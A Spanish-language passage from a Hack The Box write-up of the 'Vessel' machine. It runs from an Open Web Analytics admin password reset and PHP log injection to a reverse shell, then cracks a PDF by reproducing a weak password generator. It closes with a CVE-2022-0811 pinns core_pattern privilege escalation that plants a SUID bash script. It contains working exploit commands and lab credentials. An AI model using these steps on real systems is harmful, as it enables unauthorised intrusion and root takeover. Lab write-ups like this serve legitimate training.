      bool(false)
      ["is_unique"]=>
      bool(false)
      ["is_not_null"]=>
      bool(false)
      ["label"]=>
      NULL
      ["index"]=>
      NULL
      ["default_value"]=>
      NULL
    }
    ["real_name"]=>
    object(__PHP_Incomplete_Class)#6 (12) {
      ["__PHP_Incomplete_Class_Name"]=>
      string(12) "owa_dbColumn"
      ["name"]=>
      NULL
      ["value"]=>
      string(13) "default admin"
      ["data_type"]=>
      string(12) "VARCHAR(255)"
      ["foreign_key"]=>
      NULL
      ["is_primary_key"]=>
      bool(false)
      ["auto_increment"]=>
      bool(false)
      ["is_unique"]=>
      bool(false)
      ["is_not_null"]=>
      bool(false)
      ["label"]=>
      NULL
      ["index"]=>
      NULL
      ["default_value"]=>
      NULL
    }
    ["email_address"]=>
    object(__PHP_Incomplete_Class)#7 (12) {
      ["__PHP_Incomplete_Class_Name"]=>
      string(12) "owa_dbColumn"
      ["name"]=>
      NULL
      ["value"]=>
      string(16) "admin@vessel.htb"
      ["data_type"]=>
      string(12) "VARCHAR(255)"
      ["foreign_key"]=>
      NULL
      ["is_primary_key"]=>
      bool(false)
      ["auto_increment"]=>
      bool(false)
      ["is_unique"]=>
      bool(false)
      ["is_not_null"]=>
      bool(false)
      ["label"]=>
      NULL
      ["index"]=>
      NULL
      ["default_value"]=>
      NULL
    }
    ["temp_passkey"]=>
    object(__PHP_Incomplete_Class)#8 (12) {
      ["__PHP_Incomplete_Class_Name"]=>
      string(12) "owa_dbColumn"
      ["name"]=>
      NULL
      ["value"]=>
      string(32) "42d0e0131e5070765cedd599518e93ec"
      ["data_type"]=>
      string(12) "VARCHAR(255)"
      ["foreign_key"]=>
      NULL
      ["is_primary_key"]=>
      bool(false)
      ["auto_increment"]=>
      bool(false)
      ["is_unique"]=>
      bool(false)
      ["is_not_null"]=>
      bool(false)
      ["label"]=>
      NULL
      ["index"]=>
      NULL
      ["default_value"]=>
      NULL
    }
    ["creation_date"]=>
    object(__PHP_Incomplete_Class)#9 (12) {
      ["__PHP_Incomplete_Class_Name"]=>
      string(12) "owa_dbColumn"
      ["name"]=>
      NULL
      ["value"]=>
      string(10) "1650211659"
      ["data_type"]=>
      string(6) "BIGINT"
      ["foreign_key"]=>
      NULL
      ["is_primary_key"]=>
      bool(false)
      ["auto_increment"]=>
      bool(false)
      ["is_unique"]=>
      bool(false)
      ["is_not_null"]=>
      bool(false)
      ["label"]=>
      NULL
      ["index"]=>
      NULL
      ["default_value"]=>
      NULL
    }
    ["last_update_date"]=>
    object(__PHP_Incomplete_Class)#10 (12) {
      ["__PHP_Incomplete_Class_Name"]=>
      string(12) "owa_dbColumn"
      ["name"]=>
      NULL
      ["value"]=>
      string(10) "1650211659"
      ["data_type"]=>
      string(6) "BIGINT"
      ["foreign_key"]=>
      NULL
      ["is_primary_key"]=>
      bool(false)
      ["auto_increment"]=>
      bool(false)
      ["is_unique"]=>
      bool(false)
      ["is_not_null"]=>
      bool(false)
      ["label"]=>
      NULL
      ["index"]=>
      NULL
      ["default_value"]=>
      NULL
    }
    ["api_key"]=>
    object(__PHP_Incomplete_Class)#11 (12) {
      ["__PHP_Incomplete_Class_Name"]=>
      string(12) "owa_dbColumn"
      ["name"]=>
      string(7) "api_key"
      ["value"]=>
      string(32) "a390cc0247ecada9a2b8d2338b9ca6d2"
      ["data_type"]=>
      string(12) "VARCHAR(255)"
      ["foreign_key"]=>
      NULL
      ["is_primary_key"]=>
      bool(false)
      ["auto_increment"]=>
      bool(false)
      ["is_unique"]=>
      bool(false)
      ["is_not_null"]=>
      bool(false)
      ["label"]=>
      NULL
      ["index"]=>
      NULL
      ["default_value"]=>
      NULL
    }
  }
  ["_tableProperties"]=>
  array(4) {
    ["alias"]=>
    string(4) "user"
    ["name"]=>
    string(8) "owa_user"
    ["cacheable"]=>
    bool(true)
    ["cache_expiration_period"]=>
    int(604800)
  }
  ["wasPersisted"]=>
  bool(true)
  ["cache"]=>
  NULL
}
```

Introduzco una nueva contraseña para el usuario ```admin```

<img src="/writeups/assets/img/Vessel-htb/12.png" alt="">

La intercepto con ```BurpSuite```. Para que se efectúe, es necesario introducir la ```temp_passkey`` que se encuentra en la data deserializada

```null
owa_password=password&owa_password2=password&owa_k=eff08fd277edff488d3be5a901b5923f&owa_action=base.usersChangePassword&owa_submit_btn=Save+Your+New+Password
```

Se mofifica sin problemas. Puedo acceder a una nueva interfaz

<img src="/writeups/assets/img/Vessel-htb/13.png" alt="">

<img src="/writeups/assets/img/Vessel-htb/14.png" alt="">

En los ajustes, se leakea la ruta de los LOGs

<img src="/writeups/assets/img/Vessel-htb/15.png" alt="">

Intercepto la petición al guardar los cambios

```null
POST /index.php?owa_do=base.optionsGeneral HTTP/1.1
Host: openwebanalytics.vessel.htb
Content-Length: 772
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://openwebanalytics.vessel.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://openwebanalytics.vessel.htb/index.php?owa_do=base.optionsGeneral
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: owa_userSession=admin; owa_passwordSession=701056e6de1c0d912736cb75767ca864c817c0cb6f446f4d5a06c898ac24fed2
Connection: close

owa_config%5Bbase.resolve_hosts%5D=1&owa_config%5Bbase.log_feedreaders%5D=1&owa_config%5Bbase.log_robots%5D=0&owa_config%5Bbase.log_named_users%5D=1&owa_config%5Bbase.excluded_ips%5D=%2C&owa_config%5Bbase.anonymize_ips%5D=0&owa_config%5Bbase.fetch_refering_page_info%5D=1&owa_config%5Bbase.p3p_policy%5D=NOI+ADM+DEV+PSAi+COM+NAV+OUR+OTRo+STP+IND+DEM&owa_config%5Bbase.query_string_filters%5D=%2C&owa_config%5Bbase.announce_visitors%5D=0&owa_config%5Bbase.notice_email%5D=admin%40vessel.htb&owa_config%5Bbase.geolocation_lookup%5D=1&owa_config%5Bbase.track_feed_links%5D=1&owa_config%5Bbase.async_log_dir%5D=%2Fvar%2Fwww%2Fhtml%2Fowa%2Fowa-data%2Flogs%2F&owa_config%5Bbase.timezone%5D=America%2FLos_Angeles&owa_nonce=52e5c089f6&owa_action=base.optionsUpdate&owa_module=base
```

Añado otro campo con un Mass Asignement Attack

```null
owa_config[base.error_log_file]=2
```

Se crea un archivo temporal ```errors.txt```

<img src="/writeups/assets/img/Vessel-htb/16.png" alt="">

Como la web interpreta PHP, puedo tratar de inyectar código en alguno de los campos

<img src="/writeups/assets/img/Vessel-htb/17.png" alt="">

<img src="/writeups/assets/img/Vessel-htb/18.png" alt="">

Gano acceso al sistema como ```www-data```

```null
nc -nlvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.178.
Ncat: Connection from 10.10.11.178:44852.
script /dev/null -c bash
Script started, file is /dev/null
www-data@vessel:/var/www/html/owa/owa-data/caches$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
www-data@vessel:/var/www/html/owa/owa-data/caches$ export TERM=xterm
www-data@vessel:/var/www/html/owa/owa-data/caches$ export SHELL=bash
www-data@vessel:/var/www/html/owa/owa-data/caches$ stty rows 55 columns 209
```

Existe un exploit público en [Github](https://github.com/garySec/CVE-2022-24637) que automatiza todo este proceso

```null
python3 exploit.py 'http://openwebanalytics.vessel.htb' 10.10.16.3 443
Attempting to generate cache for "admin" user
Attempting to find cache of "admin" user
Found temporary password for user "admin": 6a7d50f1df6cbf9d6d602a24e5f9d9af
Changed the password of "admin" to "admin"
Logged in as "admin" user
Creating log file
Wrote payload to log file
Triggering payload! Check your listener!
You can trigger the payload again at "http://openwebanalytics.vessel.htb/owa-data/caches/Rof6FGWA.php"
```

En el directorio personal de ```steven``` hay un directorio ```.notes```

```null
www-data@vessel:/home/steven$ ls -la
total 33796
drwxrwxr-x 3 steven steven     4096 Aug 11  2022 .
drwxr-xr-x 4 root   root       4096 Aug 11  2022 ..
lrwxrwxrwx 1 root   root          9 Apr 18  2022 .bash_history -> /dev/null
-rw------- 1 steven steven      220 Apr 17  2022 .bash_logout
-rw------- 1 steven steven     3771 Apr 17  2022 .bashrc
drwxr-xr-x 2 ethan  steven     4096 Aug 11  2022 .notes
-rw------- 1 steven steven      807 Apr 17  2022 .profile
-rw-r--r-- 1 ethan  steven 34578147 May  4  2022 passwordGenerator
```

Contiene una imagen y un documento en PDF. Los transfiero a mi equipo

```null
www-data@vessel:/home/steven/.notes$ ls
notes.pdf  screenshot.png
```

La imagen se ve así: Está empleando 32 caracteres, me puede servir para saber la longitud exacta de la contraseña

<img src="/writeups/assets/img/Vessel-htb/19.png" alt="">

El PDF está protegido por contraseña

<img src="/writeups/assets/img/Vessel-htb/20.png" alt="">

Utilizo ```pdf2john``` para crear un hash equivalente y crackearlo por fuerza bruta

```null
pdf2john notes.pdf > hash
```

Pero no encuentra la contraseña

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 3 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:32 DONE (2023-04-10 08:56) 0g/s 443192p/s 443192c/s 443192C/s  0 0 0..*7¡Vamos!
Session completed. 
```

Me transfiero un binario compilado de Windows también del directorio personal de ```steven```

```null
www-data@vessel:/home/steven$ file passwordGenerator 
passwordGenerator: PE32 executable (console) Intel 80386, for MS Windows
```

Con ```strings``` puedo ver cadenas en python en texto claro

```null
strings -n 80 passwordGenerator | head -n 2
import sys; sys.stdout.flush();                 (sys.__stdout__.flush if sys.__stdout__                 is not sys.stdout else (lambda: None))()
import sys; sys.stderr.flush();                 (sys.__stderr__.flush if sys.__stderr__                 is not sys.stderr else (lambda: None))()
```

Utilizo una herramienta llamada ```pyinstxtractor.py``` para decompilarlo

```null
python3 pyinstxtractor.py passwordGenerator
[+] Processing passwordGenerator
[+] Pyinstaller version: 2.1+
[+] Python version: 3.7
[+] Length of package: 34300131 bytes
[+] Found 95 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_subprocess.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: pyi_rth_pyside2.pyc
[+] Possible entry point: passwordGenerator.pyc
[!] Warning: This script is running in a different Python version than the one used to build the executable.
[!] Please run this script in Python 3.7 to prevent extraction errors during unmarshalling
[!] Skipping pyz extraction
[+] Successfully extracted pyinstaller archive: passwordGenerator

You can now use a python decompiler on the pyc files within the extracted directory
```

Esto ha creado un directorio con todos los archivos que lo componen

```null
ls -la
total 62772
drwxr-xr-x 5 root root     4096 Apr 10 09:10 .
drwxr-xr-x 5 root root     4096 Apr 10 09:10 ..
-rw-r--r-- 1 root root   796140 Apr 10 09:10 base_library.zip
-rw-r--r-- 1 root root    78352 Apr 10 09:10 _bz2.pyd
-rw-r--r-- 1 root root   104976 Apr 10 09:10 _ctypes.pyd
-rw-r--r-- 1 root root  3706048 Apr 10 09:10 d3dcompiler_47.dll
-rw-r--r-- 1 root root    32272 Apr 10 09:10 _hashlib.pyd
-rw-r--r-- 1 root root  2228256 Apr 10 09:10 libcrypto-1_1.dll
-rw-r--r-- 1 root root    27928 Apr 10 09:10 libEGL.dll
-rw-r--r-- 1 root root  2942232 Apr 10 09:10 libGLESv2.dll
-rw-r--r-- 1 root root   537632 Apr 10 09:10 libssl-1_1.dll
-rw-r--r-- 1 root root   146960 Apr 10 09:10 _lzma.pyd
-rw-r--r-- 1 root root    28952 Apr 10 09:10 MSVCP140_1.dll
-rw-r--r-- 1 root root   435600 Apr 10 09:10 MSVCP140.dll
-rw-r--r-- 1 root root 15995904 Apr 10 09:10 opengl32sw.dll
-rw-r--r-- 1 root root     7910 Apr 10 09:10 passwordGenerator.pyc
-rw-r--r-- 1 root root   162320 Apr 10 09:10 pyexpat.pyd
-rw-r--r-- 1 root root     1378 Apr 10 09:10 pyiboot01_bootstrap.pyc
-rw-r--r-- 1 root root     1700 Apr 10 09:10 pyimod01_os_path.pyc
-rw-r--r-- 1 root root     8721 Apr 10 09:10 pyimod02_archive.pyc
-rw-r--r-- 1 root root    17748 Apr 10 09:10 pyimod03_importers.pyc
-rw-r--r-- 1 root root     3640 Apr 10 09:10 pyimod04_ctypes.pyc
-rw-r--r-- 1 root root      676 Apr 10 09:10 pyi_rth_inspect.pyc
-rw-r--r-- 1 root root     1081 Apr 10 09:10 pyi_rth_pkgutil.pyc
-rw-r--r-- 1 root root      457 Apr 10 09:10 pyi_rth_pyside2.pyc
-rw-r--r-- 1 root root      811 Apr 10 09:10 pyi_rth_subprocess.pyc
drwxr-xr-x 4 root root     4096 Apr 10 09:10 PySide2
-rw-r--r-- 1 root root   148248 Apr 10 09:10 pyside2.abi3.dll
-rw-r--r-- 1 root root  3441168 Apr 10 09:10 python37.dll
-rw-r--r-- 1 root root    58896 Apr 10 09:10 python3.dll
-rw-r--r-- 1 root root  1193342 Apr 10 09:10 PYZ-00.pyz
drwxr-xr-x 2 root root     4096 Apr 10 09:10 PYZ-00.pyz_extracted
-rw-r--r-- 1 root root  5386520 Apr 10 09:10 Qt5Core.dll
-rw-r--r-- 1 root root   349976 Apr 10 09:10 Qt5DBus.dll
-rw-r--r-- 1 root root  5899032 Apr 10 09:10 Qt5Gui.dll
-rw-r--r-- 1 root root  1056024 Apr 10 09:10 Qt5Network.dll
-rw-r--r-- 1 root root  4034328 Apr 10 09:10 Qt5Pdf.dll
-rw-r--r-- 1 root root  2980120 Apr 10 09:10 Qt5Qml.dll
-rw-r--r-- 1 root root   355096 Apr 10 09:10 Qt5QmlModels.dll
-rw-r--r-- 1 root root  3494680 Apr 10 09:10 Qt5Quick.dll
-rw-r--r-- 1 root root   269080 Apr 10 09:10 Qt5Svg.dll
-rw-r--r-- 1 root root  2048280 Apr 10 09:10 Qt5VirtualKeyboard.dll
-rw-r--r-- 1 root root   127256 Apr 10 09:10 Qt5WebSockets.dll
-rw-r--r-- 1 root root  4464408 Apr 10 09:10 Qt5Widgets.dll
-rw-r--r-- 1 root root    23568 Apr 10 09:10 select.pyd
drwxr-xr-x 2 root root     4096 Apr 10 09:10 shiboken2
-rw-r--r-- 1 root root   234776 Apr 10 09:10 shiboken2.abi3.dll
-rw-r--r-- 1 root root    66064 Apr 10 09:10 _socket.pyd
-rw-r--r-- 1 root root   100880 Apr 10 09:10 _ssl.pyd
-rw-r--r-- 1 root root      297 Apr 10 09:10 struct.pyc
-rw-r--r-- 1 root root  1063440 Apr 10 09:10 unicodedata.pyd
-rw-r--r-- 1 root root    83768 Apr 10 09:10 VCRUNTIME140.dll
```

Pero me interesa solo un script que contemple todo. Para ello utilizo ```uncompyle6```

```null
uncompyle6 passwordGenerator_extracted/passwordGenerator.pyc > passwordGenerator.py
```

El script final queda así:

```py
# uncompyle6 version 3.9.0
# Python bytecode version base 3.7.0 (3394)
# Decompiled from: Python 2.7.18 (default, Aug  1 2022, 06:23:55) 
# [GCC 12.1.0]
# Embedded file name: passwordGenerator.py
from PySide2.QtCore import *
from PySide2.QtGui import *
from PySide2.QtWidgets import *
from PySide2 import QtWidgets
import pyperclip

class Ui_MainWindow(object):

    def setupUi(self, MainWindow):
        if not MainWindow.objectName():
            MainWindow.setObjectName('MainWindow')
        MainWindow.resize(560, 408)
        self.centralwidget = QWidget(MainWindow)
        self.centralwidget.setObjectName('centralwidget')
        self.title = QTextBrowser(self.centralwidget)
        self.title.setObjectName('title')
        self.title.setGeometry(QRect(80, 10, 411, 51))
        self.textBrowser_2 = QTextBrowser(self.centralwidget)
        self.textBrowser_2.setObjectName('textBrowser_2')
        self.textBrowser_2.setGeometry(QRect(10, 80, 161, 41))
        self.generate = QPushButton(self.centralwidget)
        self.generate.setObjectName('generate')
        self.generate.setGeometry(QRect(140, 330, 261, 51))
        self.PasswordLength = QSpinBox(self.centralwidget)
        self.PasswordLength.setObjectName('PasswordLength')
        self.PasswordLength.setGeometry(QRect(30, 130, 101, 21))
        self.PasswordLength.setMinimum(10)
        self.PasswordLength.setMaximum(40)
        self.copyButton = QPushButton(self.centralwidget)
        self.copyButton.setObjectName('copyButton')
        self.copyButton.setGeometry(QRect(460, 260, 71, 61))
        self.textBrowser_4 = QTextBrowser(self.centralwidget)
        self.textBrowser_4.setObjectName('textBrowser_4')
        self.textBrowser_4.setGeometry(QRect(190, 170, 141, 41))
        self.checkBox = QCheckBox(self.centralwidget)
        self.checkBox.setObjectName('checkBox')
        self.checkBox.setGeometry(QRect(250, 220, 16, 17))
        self.checkBox.setCheckable(True)
        self.checkBox.setChecked(False)
        self.checkBox.setTristate(False)
        self.comboBox = QComboBox(self.centralwidget)
        self.comboBox.addItem('')
        self.comboBox.addItem('')
        self.comboBox.addItem('')
        self.comboBox.setObjectName('comboBox')
        self.comboBox.setGeometry(QRect(350, 130, 161, 21))
        self.textBrowser_5 = QTextBrowser(self.centralwidget)
        self.textBrowser_5.setObjectName('textBrowser_5')
        self.textBrowser_5.setGeometry(QRect(360, 80, 131, 41))
        self.password_field = QLineEdit(self.centralwidget)
        self.password_field.setObjectName('password_field')
        self.password_field.setGeometry(QRect(100, 260, 351, 61))
        MainWindow.setCentralWidget(self.centralwidget)
        self.statusbar = QStatusBar(MainWindow)
        self.statusbar.setObjectName('statusbar')
        MainWindow.setStatusBar(self.statusbar)
        self.retranslateUi(MainWindow)
        QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        MainWindow.setWindowTitle(QCoreApplication.translate('MainWindow', 'MainWindow', None))
        self.title.setDocumentTitle('')
        self.title.setHtml(QCoreApplication.translate('MainWindow', '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd">\n<html><head><meta name="qrichtext" content="1" /><style type="text/css">\np, li { white-space: pre-wrap; }\n</style></head><body style=" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;">\n<p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-size:20pt;">Secure Password Generator</span></p></body></html>', None))
        self.textBrowser_2.setDocumentTitle('')
        self.textBrowser_2.setHtml(QCoreApplication.translate('MainWindow', '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd">\n<html><head><meta name="qrichtext" content="1" /><style type="text/css">\np, li { white-space: pre-wrap; }\n</style></head><body style=" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;">\n<p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-size:14pt;">Password Length</span></p></body></html>', None))
        self.generate.setText(QCoreApplication.translate('MainWindow', 'Generate!', None))
        self.copyButton.setText(QCoreApplication.translate('MainWindow', 'Copy', None))
        self.textBrowser_4.setDocumentTitle('')
        self.textBrowser_4.setHtml(QCoreApplication.translate('MainWindow', '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd">\n<html><head><meta name="qrichtext" content="1" /><style type="text/css">\np, li { white-space: pre-wrap; }\n</style></head><body style=" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;">\n<p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-size:14pt;">Hide Password</span></p></body></html>', None))
        self.checkBox.setText('')
        self.comboBox.setItemText(0, QCoreApplication.translate('MainWindow', 'All Characters', None))
        self.comboBox.setItemText(1, QCoreApplication.translate('MainWindow', 'Alphabetic', None))
        self.comboBox.setItemText(2, QCoreApplication.translate('MainWindow', 'Alphanumeric', None))
        self.textBrowser_5.setDocumentTitle('')
        self.textBrowser_5.setHtml(QCoreApplication.translate('MainWindow', '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd">\n<html><head><meta name="qrichtext" content="1" /><style type="text/css">\np, li { white-space: pre-wrap; }\n</style></head><body style=" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;">\n<p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-size:16pt;">characters</span></p></body></html>', None))
        self.password_field.setText('')


class MainWindow(QMainWindow, Ui_MainWindow):

    def __init__(self):
        super(MainWindow, self).__init__()
        self.setupUi(self)
        self.setFixedSize(QSize(550, 400))
        self.setWindowTitle('Secure Password Generator')
        self.password_field.setReadOnly(True)
        self.passlen()
        self.chars()
        self.hide()
        self.gen()

    def passlen(self):
        self.PasswordLength.valueChanged.connect(self.lenpass)

    def lenpass(self, l):
        global value
        value = l

    def chars(self):
        self.comboBox.currentIndexChanged.connect(self.charss)

    def charss(self, i):
        global index
        index = i

    def hide(self):
        self.checkBox.stateChanged.connect(self.status)

    def status(self, s):
        global status
        status = s == Qt.Checked

    def copy(self):
        self.copyButton.clicked.connect(self.copied)

    def copied(self):
        pyperclip.copy(self.password_field.text())

    def gen(self):
        self.generate.clicked.connect(self.genButton)

    def genButton(self):
        try:
            hide = status
            if hide:
                self.password_field.setEchoMode(QLineEdit.Password)
            else:
                self.password_field.setEchoMode(QLineEdit.Normal)
            password = self.genPassword()
            self.password_field.setText(password)
        except:
            msg = QMessageBox()
            msg.setWindowTitle('Warning')
            msg.setText('Change the default values before generating passwords!')
            x = msg.exec_()

        self.copy()

    def genPassword(self):
        length = value
        char = index
        if char == 0:
            charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_-+={}[]|:;<>,.?'
        else:
            if char == 1:
                charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
            else:
                if char == 2:
                    charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'
                else:
                    try:
                        qsrand(QTime.currentTime().msec())
                        password = ''
                        for i in range(length):
                            idx = qrand() % len(charset)
                            nchar = charset[idx]
                            password += str(nchar)

                    except:
                        msg = QMessageBox()
                        msg.setWindowTitle('Error')
                        msg.setText('Error while generating password!, Send a message to the Author!')
                        x = msg.exec_()

                return password


if __name__ == '__main__':
    app = QtWidgets.QApplication()
    mainwindow = MainWindow()
    mainwindow.show()
    app.exec_()
# okay decompiling passwordGenerator_extracted/passwordGenerator.pyc
```

Puedo tratar de reutilar la función ```genPassword``` para crear un diccionario de contraseñas

```py
from PySide2.QtCore import *

length = 32
charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_-+={}[]|:;<>,.?'

for i in range(0, 1000):
    qsrand(i)
    password = ''
    for i in range(length):
        idx = qrand() % len(charset)
        nchar = charset[idx]
        password += str(nchar)
    print(password)
```

Pero a pesar de todo, ninguna contraseña es válida

```null
python3 test.py > passwords.txt
```

```null
john -w:passwords.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 3 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2023-10-14 16:20) 0g/s 99900p/s 99900c/s 99900C/s 2J16^>.|vtXpN2[o1H;e4f|FF0([y+|q..l2DoG^icl}>kZ[tNB|:]m5km@{x:^7ck
Session completed. 
```

Esto puede deberse a que la librería no opera igual en linux que en Windows. Transfiero el script a una máquina Windows, instalo la librería y ejecuto

<img src="/writeups/assets/img/Vessel-htb/21.png" alt="">

Para mover el diccionario a mi máquina Linux, es importante copiar y pegar para no arriesgarse a que se convierta a ```utf-16le```, que es el encoder que utiliza Windows por defecto, debe de permanecer en ```utf-8```. Si trato de crackear con estas, el resultado cambia

```null
john -w:passwords.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 3 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
YG7Q7RDzA+q&ke~MJ8!yRzoI^VQxSqSS (notes.pdf)     
1g 0:00:00:00 DONE (2023-10-14 16:45) 100.0g/s 38400p/s 38400c/s 38400C/s _jEkA+f0VXtWZ[K.d+EdaBAB>;r]E3Z*..r6TUgox@Tb5JWnK5AHO}$AE%8!d58Shq
Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed.
```

El PDF contiene la contraseña del usuario ```ethan``` a nivel de sistema

<img src="/writeups/assets/img/Vessel-htb/22.png" alt="">

Puedo ver la primera flag

```null
www-data@vessel:/home/steven/.notes$ su ethan
Password: 
ethan@vessel:/home/steven/.notes$ cd
ethan@vessel:~$ cat user.txt 
afa7ee371fb3ba934a9bf19535692637
```

# Escalada

Busco por archivos cuyo propietario sea ```ethan```, pero no encuentro nada interesante

```null
ethan@vessel:/$ find \-user ethan 2>/dev/null | grep -vE "run|user|proc"
./home/steven/passwordGenerator
./home/steven/.notes
./home/steven/.notes/screenshot.png
./home/steven/.notes/notes.pdf
./home/ethan
./home/ethan/.cache
./home/ethan/.cache/motd.legal-displayed
./home/ethan/.local
./home/ethan/.local/share
./home/ethan/.local/share/nano
./home/ethan/.bashrc
./home/ethan/.gnupg
./home/ethan/.gnupg/crls.d
./home/ethan/.gnupg/crls.d/DIR.txt
./home/ethan/.gnupg/private-keys-v1.d
./home/ethan/.profile
./home/ethan/.bash_logout
```

Sin embargo, por grupos aparece algo inusual

```null
ethan@vessel:/$ find \-group ethan 2>/dev/null | grep -vE "run|user|proc|home"
./usr/bin/pinns
```

Este binario es SUID, el propietario es ```root``` y pueden ejecutarlo los usuarios que pertenecen al grupo ```ethan```

```null
ethan@vessel:/$ find \-group ethan 2>/dev/null | grep -vE "run|user|proc|home" | xargs ls -l
-rwsr-x--- 1 root ethan 814936 Mar 15  2022 ./usr/bin/pinns
```

Busco por vulnerabilidades asociadas a este y encuentro un CVE que permite ejecución de comandos

<img src="/writeups/assets/img/Vessel-htb/23.png" alt="">

Siguiendo el [post](https://sysdig.com/blog/cve-2022-0811-cri-o/) compruebo si afecta a la versión de la máquina

```null
ethan@vessel:/$ crio --version
crio version 1.19.6
Version:       1.19.6
GitCommit:     c12bb210e9888cf6160134c7e636ee952c45c05a
GitTreeState:  clean
BuildDate:     2022-03-15T18:18:24Z
GoVersion:     go1.15.2
Compiler:      gc
Platform:      linux/amd64
Linkmode:      dynamic
```

Está instalada la versión ```1.19.6```, por lo que sí que aplica. En [crowdstrike](https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/) está detallado un PoC. Es posible modificar parámetros del kernelm para ejecutar una tarea indicada forzando un error. Esto está controlado por dos archivos. El primero es ```/proc/sys/kernel/core_pattern```, que por defecto apunta a un binario del sistema

```null
ethan@vessel:/$ cat /proc/sys/kernel/core_pattern
|/usr/share/apport/apport %p %s %c %d %P %E
```

Aquí es donde voy a cambiar la ruta para que apunte a un script de bash que le asigne el privilegio SUID. Por otro lado está el ```/proc/sys/kernel/shm_rmid_forced```. Puede tener dos posiciones, 0 y 1. En caso de que esté activado, se permite al kernel forzar la eliminación de segmentos de memoria compartida, en caso de que el último proceso termine para liberar ese espacio que ha sido asignado. Esto va a permitir que el programa se corrompa y se llamé al script de bash para realizar un "informe", en este caso no va a ser así, ya que está modificado con otros fines. Ejecuto pinns siguiendo la guía para modificar los parámetros, pero aparece un error de argumentos

```null
ethan@vessel:/$ pinns -s 'kernel.shm_rmid_forced=1+kernel.core_pattern=|/tmp/pwned.sh'
[pinns:e]: Path for pinning namespaces not specified: Invalid argument
```

Al ser de código abierto, puedo abrir el repositorio de ```crio``` en [Github](https://github.com/cri-o/cri-o/blob/main/pinns/src/pinns.c). Por cada error que daba añadí el parámetro necesario, hasta que, finalmente, modificó los valores

```null
ethan@vessel:/$ pinns -s'kernel.shm_rmid_forced=1+kernel.core_pattern=|/tmp/pwned.sh' -d /dev/shm/ -f pwned -U
[pinns:e]: Failed to bind mount ns: /proc/self/ns/user: Operation not permitted
```

```null
ethan@vessel:/$ cat /proc/sys/kernel/core_pattern 
|/tmp/pwned.sh
ethan@vessel:/$ cat /proc/sys/kernel/shm_rmid_forced
1
```

Creo un script llamado ```pwned.sh``` que copie la ```bash``` al directorio ```/tmp``` y le asigne SUID. Le doy permisos de ejecución

```bash
#!/bin/bash

cp /bin/bash /tmp/bash
chown root:root /tmp/bash
chmod u+s /tmp/bash
```

```null
ethan@vessel:/tmp$ chmod +x pwned.sh 
```

Para forzar la ejecución, hay que crear lo que se conoce como un ```core dump```.

```null
ethan@vessel:/tmp$ pinns -s 'kernel.shm_rmid_forced=1'+'kernel.core_pattern=|/tmp/pwned.sh #' -f pwned -d /dev/shm -U
```

```null
ethan@vessel:/tmp$ sleep 100 &
[1] 1503
```

```null
ethan@vessel:/tmp$ killall -s SIGSEGV sleep
```

```null
ethan@vessel:/tmp$ ls -l bash
